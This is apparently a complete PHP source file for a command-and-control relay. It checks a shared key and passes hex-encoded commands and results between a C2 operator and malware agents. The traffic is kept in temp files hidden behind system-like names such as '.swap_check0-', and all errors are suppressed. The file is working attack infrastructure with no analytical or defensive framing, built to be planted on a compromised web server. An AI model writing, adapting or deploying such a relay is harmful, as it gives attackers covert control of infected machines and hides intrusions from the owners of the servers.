<?php
$k = "[PROXY_KEY]";
$c_path  = @sys_get_temp_dir() . "/.swap_check0-";
$a_path = @sys_get_temp_dir() . "/.swap_check1";

// key must be provided
if (!isset($_POST['k'])) {
    echo "[ERROR_KEY_MISSING]";
    goto end;
}
if ($_POST['k'] !== $k) {
    echo "[ERROR_KEY_MISMATCH]";
    goto end;
}

$storage_c = $c_path;
if (isset($_POST["i"])) {
    if (!preg_match("/^[a-z0-9]{1,10}/si", $_POST["i"])) {
        echo "[ERROR_INVALID_AGENT_ID]";
        goto end;
    }
    $storage_c .= $_POST["i"];
}
$storage_a = $a_path;

// incoming fetch for c2 ('c') or for agent ('a') data
// agent fetch reads from c2 storage
// c2 fetch reads from agent storage
if (isset($_POST["f"])) {
    switch ($_POST["f"]) {
        case "c":
            $content = @file_get_contents($storage_c);
            @file_put_contents($storage_c, "");
            if (!$content) {
                echo "[OK_NO_DATA]";
                break;
            }
            echo $content;
            break;
        case "a":
            $content = @file_get_contents($storage_a);
            // clear agent commands
            @file_put_contents($storage_a, "");
            if (!$content) {
                echo "[OK_NO_DATA]";
                break;
            }
            echo $content;
            break;
    }
    // incoming c2 ('c') or agent ('a') data ('d')
} else if (isset($_POST['p']) && isset($_POST['d'])) {
    // data separator is ";"
    if (!preg_match('/^[\:\;a-f0-9\.]+$/si', $_POST['d'])) {
        echo "[ERROR_INVALID_DATA_SENT]";
        goto end;
    }

    switch ($_POST["p"]) {
        case "a":
            $ret = @file_put_contents($storage_a, $_POST["d"], FILE_APPEND);
            if ($ret === false) {
                echo "[ERROR_WRITING_TO_AGENT_STORAGE]";
                break;
            }
            echo "[OK_RECEIVED_FROM_AGENT]";
            break;
        case "c":
            $ret = @file_put_contents($storage_c, $_POST["d"]);
            if ($ret === false) {
                echo "[ERROR_WRITING_TO_C2_STORAGE]";
                break;
            }
            echo "[OK_RECEIVED_FROM_C2]";
            break;
    }
} else {
    echo "[ERROR_INVALID_REQUEST]";
}
end:
